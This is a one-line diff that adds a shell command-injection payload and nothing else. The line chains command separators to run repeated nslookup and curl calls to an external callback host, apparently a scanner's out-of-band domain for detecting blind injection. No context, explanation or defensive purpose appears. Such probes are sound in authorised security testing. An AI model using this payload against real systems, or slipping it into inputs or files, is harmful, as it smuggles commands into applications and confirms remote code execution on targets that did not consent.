@@ -1,0 +1,1 @@
+;(nslookup -q=cname hitwpqpgfgbbwa7d83.bxss.me||curl hitwpqpgfgbbwa7d83.bxss.me)|(nslookup -q=cname hitwpqpgfgbbwa7d83.bxss.me||curl hitwpqpgfgbbwa7d83.bxss.me)&(nslookup -q=cname hitwpqpgfgbbwa7d83.bxss.me||curl hitwpqpgfgbbwa7d83.bxss.me)
